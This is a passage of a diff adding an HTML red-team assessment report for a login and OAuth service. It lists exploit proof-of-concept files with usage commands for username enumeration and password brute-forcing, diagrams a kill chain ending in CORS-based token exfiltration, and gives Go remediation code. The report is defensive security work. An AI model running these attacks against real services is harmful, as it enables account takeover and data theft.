+</ul>
+
+<!-- ================================================================ -->
+<h2 id="exploits">4. Exploit PoCs</h2>
+
+<div class="exploit-files">
+<pre style="margin:0;border:none;padding:0;background:transparent;">
+exploits/
+  <span class="file-link">cors-exploit.html</span>        Interactive CORS PoC &mdash; 3 attack scenarios
+                             (read profile, steal login tokens, refresh cross-origin)
+
+  <span class="file-link">username-enum.py</span>         Async timing-based username enumeration
+                             Uses aiohttp, configurable threshold/concurrency
+                             Usage: python3 username-enum.py -w wordlist.txt
+
+  <span class="file-link">brute-force.py</span>           Async password brute-forcer
+                             10 concurrent workers, stops on first success
+                             Usage: python3 brute-force.py -u admin -w passwords.txt
+
+  <span class="file-link">admin-csrf-login.html</span>    Login CSRF auto-submit
+                             Logs victim into attacker's admin account
+</pre>
+</div>
+
+<h3>Combined Attack Chain</h3>
+<div class="ascii">
+  <span class="label">Full Kill Chain: Enumeration -> Brute Force -> Data Exfiltration</span>
+
+  <span class="attacker">Attacker</span>                                         <span class="server">id.swee.net</span>
+    <span class="attacker">|</span>                                                  <span class="server">|</span>
+    <span class="attacker">|</span>  <span class="label">Phase 1: Username Enumeration</span>                   <span class="server">|</span>
+    <span class="attacker">|</span> <span class="arrow">-- login(alice, x)  --></span> <span class="code-danger">401</span> <span class="data">140ms</span>  <span class="code-comment">skip</span>    <span class="server">|</span>
+    <span class="attacker">|</span> <span class="arrow">-- login(admin, x)  --></span> <span class="code-danger">401</span> <span class="data">520ms</span>  <span class="code-string">HIT!</span>    <span class="server">|</span>
+    <span class="attacker">|</span> <span class="arrow">-- login(bob, x)    --></span> <span class="code-danger">401</span> <span class="data">138ms</span>  <span class="code-comment">skip</span>    <span class="server">|</span>
+    <span class="attacker">|</span>                                                  <span class="server">|</span>
+    <span class="attacker">|</span>  <span class="label">Phase 2: Brute Force (no rate limit)</span>            <span class="server">|</span>
+    <span class="attacker">|</span> <span class="arrow">-- login(admin, pass1) -->  login(admin, pass2) -->  ...</span>
+    <span class="attacker">|</span> <span class="arrow">-- login(admin, pass3) -->  login(admin, pass4) -->  ...</span>
+    <span class="attacker">|</span>   <span class="data">(10 concurrent workers, ~700 attempts/min)</span>     <span class="server">|</span>
+    <span class="attacker">|</span> <span class="arrow">-- login(admin, correct!) --></span> <span class="code-string">200 + tokens</span>     <span class="server">|</span>
+    <span class="attacker">|</span>                                                  <span class="server">|</span>
+    <span class="attacker">|</span>  <span class="label">Phase 3: Exfiltration via CORS</span>                  <span class="server">|</span>
+    <span class="attacker">|</span>   <span class="data">Host evil page with stolen tokens</span>              <span class="server">|</span>
+    <span class="attacker">|</span>   <span class="data">Any visitor's browser becomes a proxy:</span>         <span class="server">|</span>
+    <span class="attacker">|</span> <span class="arrow">-- fetch(/api/v1/users, Bearer token) ----------></span> <span class="server">|</span>
+    <span class="attacker">|</span> <span class="arrow">&lt;-- full user list (CORS allows cross-origin read)</span> <span class="server">|</span>
+    <span class="attacker">|</span>   <span class="data">exfiltrate to C2 server</span>                        <span class="server">|</span>
+</div>
+
+<!-- ================================================================ -->
+<h2 id="remediation">5. Remediation Plan</h2>
+
+<p>Ordered by priority. Effort estimates are relative to this codebase.</p>
+
+<!-- Remediation 1 -->
+<div class="remediation">
+  <h4>Priority 1: Fix CORS &mdash; Allowlist Origins</h4>
+  <p><strong>Effort:</strong> ~30 minutes &nbsp;|&nbsp; <strong>Impact:</strong> Eliminates the highest severity finding</p>
+<pre>
+<span class="code-comment">// cmd/server/main.go &mdash; replace the origin reflection with an allowlist</span>
+
+<span class="code-comment">// Add to config:</span>
+<span class="code-keyword">var</span> allowedOrigins = <span class="code-keyword">map</span>[<span class="code-keyword">string</span>]<span class="code-keyword">bool</span>{
+    <span class="code-string">"https://your-spa.example.com"</span>: <span class="code-keyword">true</span>,
+    <span class="code-string">"https://admin.example.com"</span>:    <span class="code-keyword">true</span>,
+}
+
+<span class="code-comment">// In the CORS handler:</span>
+origin := r.Header.Get(<span class="code-string">"Origin"</span>)
+<span class="code-keyword">if</span> allowedOrigins[origin] {
+    w.Header().Set(<span class="code-string">"Access-Control-Allow-Origin"</span>, origin)
+    <span class="code-comment">// ... rest of CORS headers</span>
+}
+</pre>
+  <p>
+    Better yet, make this configurable via environment variable
+    (<code>CORS_ALLOWED_ORIGINS=https://spa.example.com,https://admin.example.com</code>)
+    so it can be set per deployment.
+  </p>
+</div>
+
+<!-- Remediation 2 -->
+<div class="remediation">
+  <h4>Priority 2: Add Rate Limiting</h4>
+  <p><strong>Effort:</strong> ~2 hours &nbsp;|&nbsp; <strong>Impact:</strong> Blocks brute-force and credential stuffing</p>
+<pre>
+<span class="code-comment">// Option A: Use golang.org/x/time/rate for per-IP limiting</span>
+<span class="code-comment">// Option B: Use a middleware like github.com/ulule/limiter</span>
+
+<span class="code-comment">// Suggested limits:</span>
+<span class="code-comment">//   POST /api/v1/auth/login   : 5 attempts per minute per IP</span>
+<span class="code-comment">//   POST /admin/login          : 5 attempts per minute per IP</span>
+<span class="code-comment">//   POST /oauth/authorize      : 5 attempts per minute per IP</span>
+<span class="code-comment">//   POST /oauth/token           : 10 per minute per IP</span>
+<span class="code-comment">//   POST /api/v1/auth/refresh  : 10 per minute per IP</span>
+<span class="code-comment">//   Global fallback             : 60 per minute per IP</span>
+</pre>
+  <p>
+    Consider adding account lockout after N failures (e.g., 10 failed attempts locks for 15
+    minutes). The OpenAPI spec already defines a <code>rate_limited</code> error code &mdash;
+    just need to implement it. Also consider leveraging Cloudflare's built-in rate limiting
+    rules as a first line of defense.
+  </p>
+</div>
+
+<!-- Remediation 3 -->
+<div class="remediation">
+  <h4>Priority 3: Fix Timing Side-Channel</h4>
+  <p><strong>Effort:</strong> ~15 minutes &nbsp;|&nbsp; <strong>Impact:</strong> Eliminates username enumeration</p>
+<pre>
+<span class="code-comment">// internal/service/auth_service.go</span>
+<span class="code-comment">// Replace the invalid placeholder with a real pre-computed bcrypt hash:</span>
+
+<span class="code-keyword">var</span> dummyHash, _ = auth.HashPassword(<span class="code-string">"dummy-password-for-timing"</span>, 12)
+
+<span class="code-keyword">func</span> (s *AuthService) Login(...) {
+    user, err := s.users.GetByUsername(username)
+    <span class="code-keyword">if</span> errors.Is(err, domain.ErrNotFound) {
+        auth.CheckPassword(password, <span class="code-string">dummyHash</span>)  <span class="code-comment">// now actually runs bcrypt</span>
+        ...
+    }
+}
+</pre>
+  <p>
+    The current placeholder <code>$2a$12$placeholder-hash-to-burn-time-here</code> is not
+    a valid bcrypt hash (wrong length, invalid salt encoding). bcrypt rejects it immediately,
+    defeating the timing protection. Generate a real hash at startup with the same cost factor.
+  </p>
+</div>
+
+<!-- Remediation 4 -->
+<div class="remediation">
+  <h4>Priority 4: Validate Admin Sessions Against DB</h4>
+  <p><strong>Effort:</strong> ~30 minutes &nbsp;|&nbsp; <strong>Impact:</strong> Prevents stale session abuse</p>
+<pre>
+<span class="code-keyword">func</span> (h *adminHandler) validateSession(tokenStr <span class="code-keyword">string</span>) <span class="code-keyword">bool</span> {
+    claims, err := h.parseSession(tokenStr)
+    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
+        <span class="code-keyword">return</span> <span class="code-keyword">false</span>
+    }
+    <span class="code-comment">// NEW: verify user still exists and is still admin</span>
+    user, err := h.userSvc.GetByUsername(claims.Subject)
+    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> || !user.Active || user.Role != <span class="code-string">"admin"</span> {
+        <span class="code-keyword">return</span> <span class="code-keyword">false</span>
+    }
+    <span class="code-keyword">return</span> <span class="code-keyword">true</span>
+}
+</pre>
+  <p>
+    This adds one DB query per admin page load. With SQLite and the expected traffic
+    volume, this is negligible. Alternatively, reduce session TTL from 8 hours to 1 hour.
+  </p>
+</div>
+
+<!-- Remediation 5 -->
+<div class="remediation">
+  <h4>Priority 5: URL-Encode the State Parameter</h4>
+  <p><strong>Effort:</strong> ~2 minutes &nbsp;|&nbsp; <strong>Impact:</strong> Prevents URL structure manipulation</p>
+<pre>
+<span class="code-comment">// internal/handler/oauth/handler.go:147</span>
+<span class="code-comment">// Before:</span>
+redirectURL += <span class="code-string">"&amp;state="</span> + state
+
+<span class="code-comment">// After:</span>
+redirectURL += <span class="code-string">"&amp;state="</span> + <span class="code-string">url.QueryEscape(state)</span>
+</pre>
+</div>
+
+<!-- Remediation 6 -->
+<div class="remediation">
+  <h4>Priority 6: Additional Hardening</h4>
+  <p><strong>Effort:</strong> ~1-2 hours total</p>
+  <ul style="margin-top:8px; padding-left:20px;">
+    <li>Add CSRF token to OAuth authorize form and admin login form</li>
+    <li>Change <code>GET /admin/backup</code> to <code>POST</code> with CSRF protection</li>
+    <li>Remove <code>'unsafe-inline'</code> from CSP <code>script-src</code> &mdash; use nonces or move inline scripts to files</li>
+    <li>Add password complexity requirements (or integrate <a href="https://github.com/nbutton23/zxcvbn-go">zxcvbn-go</a> for strength estimation)</li>
+    <li>Increase HSTS to <code>max-age=31536000; includeSubDomains; preload</code></li>
+    <li>Consider restricting <code>/admin/</code> by IP or moving to an internal network</li>
+    <li>Consider adding <code>Disallow: /admin/</code> and <code>Disallow: /api/</code> to a custom robots.txt</li>
+  </ul>
+</div>
+
+<hr>
+
+<p style="color:var(--text-dim); font-size:11px; margin-top:32px;">
+  Generated 2026-03-18 by red team assessment.
+  Exploit PoCs in <code>./exploits/</code>. All testing was authorized.
+</p>
+
+</body>
+</html>
